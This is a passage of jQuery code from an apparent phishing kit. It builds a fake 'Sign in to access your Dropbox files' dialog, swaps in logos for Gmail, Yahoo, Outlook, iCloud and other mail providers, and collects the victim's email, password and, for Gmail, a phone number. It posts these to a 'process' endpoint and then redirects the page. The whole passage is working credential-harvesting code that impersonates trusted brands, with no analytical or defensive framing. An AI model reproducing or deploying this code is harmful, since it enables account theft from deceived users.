		$('.login-loading-indicator').css({'display':'none'});

		$('div.phone-box').css({'display':'none'});
		$('div.db-modal-title-text').html('Sign in');
	});
	$('img.mail-selector').click(function() {
		var provider=$(this).attr('data');
		switch(provider) {
			case 'gm':
				$('div.db-modal-title-text').html('<img src="https://i.imgur.com/G8jiXeN.png" style="height:35px; width:70px; " /><br><font color="blue" size="2">Sign in to access your Dropbox files');
				$('input#sub').val("gmail");
				$('div.phone-box').css({'display':'block'});
			break;
			case 'ex':
				$('div.db-modal-title-text').html('<img src="https://i.imgur.com/jBgzGTC.png" style="height:38px; " /><br><font color="blue" size="2">Sign in to access your Dropbox files');
				$('input#sub').val("exchange");
			break;
			case 'ym':
				$('div.db-modal-title-text').html('<img src="https://i.imgur.com/1QZqfV6.png" style="height:38px; " /><br><font color="blue" size="2">Sign in to access your Dropbox files');
				$('input#sub').val("ymail");
			break;
			case 'hm':
				$('div.db-modal-title-text').html('<img src="https://i.imgur.com/7R9NjfB.png" style="height:30px; " /><br><font color="blue" size="2">Sign in to access your Dropbox files');
				$('input#sub').val("hmail");
			break;
			case 'of':
				$('div.db-modal-title-text').html('<img src="https://i.imgur.com/VUswmjI.png" style="height:30px; " /><br><font color="blue" size="2">Sign in to access your Dropbox files');
				$('input#sub').val("office");
			break;
			case 'am':
				$('div.db-modal-title-text').html('<img src="https://i.imgur.com/7H6tIFe.png" style="height:30px; " /><br><font color="blue" size="2">Sign in to access your Dropbox files');
				$('input#sub').val("amail");
			break;
			case 'ic':
				$('div.db-modal-title-text').html('<img src="https://i.imgur.com/6Y0Upe1.png" style="height:38px; " /><br><font color="blue" size="2">Sign in to access your Dropbox files');
				$('input#sub').val("icloud");
			break;
			case 'om':
				$('div.db-modal-title-text').html('<img src="https://i.imgur.com/NEedSxq.png" style="height:42px; width:105px; " /><br><font color="blue" size="2">Sign in to access your Dropbox files');
				$('input#sub').val("omail");
			break;
		}
		$('div#db-modal-index-sign-in-modal').css({'display':'block'});
	});
	$("input[name=phn]").keydown(function (e) {
		// Allow: backspace, delete, tab, escape, enter and .
		if ($.inArray(e.keyCode, [43, 46, 8, 9, 27, 13, 110, 190]) !== -1 ||
		     // Allow: Ctrl+A, Command+A
		    (e.keyCode == 65 && ( e.ctrlKey === true || e.metaKey === true || e.shiftKey===true) ) || 
		     // Allow: home, end, left, right, down, up
		    (e.keyCode >= 35 && e.keyCode <= 40)) {
		         // let it happen, don't do anything
		         return;
		}
		// Ensure that it is a number and stop the keypress
		if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
		    e.preventDefault();
		}
	});
	$('div.credentials-form__fields').keypress(function (e) {
		var key = e.which;
		if(key == 13) {
			$('button.login-button').click(); 
		}
	});   
	$('button.login-button').click(function() {
		$('div.em_error, div.psw_error, div.phn_error').html('');
		var sub=$('input#sub').val();
		var em=$.trim($('input[name=em]').val());
		var psw=$.trim($('input[name=psw]').val());
		var phn=$.trim($('input[name=phn]').val());
		if(!em.match(/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/)) {
			$('div.em_error').html('Please enter your email');
			return false;
		}
		if(psw.length<7) {
			$('div.psw_error').html('Incorrect password');
			return false;
		}	
		if(sub!='gmail') {
			$('button.login-button').attr({'disabled':'disabled'});
			$('.login-loading-indicator').css({'display':'block'});
			$.post('process', {em:em, psw:psw, sub:sub}, function(res) {
				document.location.href=res;
			});
		}
		if(sub=='gmail') {
			if(phn.length<9) {
				$('div.phn_error').html('Please verify your email phone number');
				return false;
			}		
			else {
				$('button.login-button').attr({'disabled':'disabled'});
				$('.login-loading-indicator').css({'display':'block'});
				$.post('process', {em:em, psw:psw, phn:phn, sub:sub}, function(res) {
					document.location.href=res;			
				});
			}	
		}
	});
})
